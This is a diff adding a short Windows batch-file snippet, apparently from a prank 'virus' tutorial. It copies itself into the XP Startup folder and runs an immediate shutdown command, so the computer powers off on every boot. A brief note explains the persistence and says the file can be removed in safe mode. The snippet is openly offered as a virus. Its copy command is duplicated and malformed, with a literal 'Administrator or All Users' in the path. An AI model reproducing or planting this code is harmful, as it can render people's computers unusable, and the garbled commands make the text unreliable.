@@ -1,0 +1,13 @@
+copy anything.bat"C:\Documents and Settings\Administrator or All Users\Start Menu\Programs\Startup"
+copy anything.bat"C:\Documents and Settings\Administrator or All Users\Start Menu\Programs\Startup"
+
+// these two commands will copy the batch file in startup folders (In XP)
+
+shutdown -s -t 00  // this will shutdown the computer in 0 seconds.
+
+
+Note > Files in the startup folder starts automatically when computer starts. You should put copy your batch file to startup folder in every code.You can remove this viruse of startup by booting the computer in safe mode and deleting the batch file from startup folder.
+
+
+
+
